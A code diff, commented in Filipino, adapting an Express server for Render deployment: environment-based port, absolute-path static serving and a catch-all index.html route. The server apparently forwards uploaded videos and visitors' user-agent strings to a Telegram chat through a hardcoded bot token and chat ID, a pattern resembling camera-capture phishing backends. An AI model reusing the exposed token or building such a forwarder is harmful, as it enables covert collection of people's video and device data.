@@ -2,12 +2,19 @@ import express from "express";
 import multer from "multer";
 import fetch from "node-fetch";
 import FormData from "form-data";
+import path from "path";
+import { fileURLToPath } from "url";
 
 const app = express();
 const upload = multer({ storage: multer.memoryStorage() });
 
+// Kuhanin ang tamang path directory para sa Render environment
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+
 // ===== CONFIGURATION CONFIG =====
-const PORT = 3000;
+// Gagamit ng PORT mula sa Render environment, fallback sa 3000 kung local dev
+const PORT = process.env.PORT || 3000; 
 const BOT_TOKEN = "8879628969:AAF5g8XnFu9Ido-nKTHj8GAWBd0R-iA5bAA";
 const CHAT_ID = "-1003979222265";
 
@@ -18,6 +25,9 @@ function buildCaption(info) {
 💻 *Device UserAgent:*
 \`${info.userAgent || "Unknown"}\``;
 }
+
+// Serve frontend assets gamit ang absolute path resolution
+app.use(express.static(path.join(__dirname, "frontend")));
 
 // Upload endpoint
 app.post("/upload-video", upload.single("video"), async (req, res) => {
@@ -72,8 +82,10 @@ app.post("/upload-video", upload.single("video"), async (req, res) => {
     }
 });
 
-// Serve frontend assets
-app.use(express.static("frontend"));
+// Pwersahang i-serve ang index.html sa kahit anong hindi tugmang rota para maiwasan ang "Not Found"
+app.get("*", (req, res) => {
+    res.sendFile(path.join(__dirname, "frontend", "index.html"));
+});
 
 app.listen(PORT, () => {
     console.log(`Server executing active processes on port ${PORT}`);
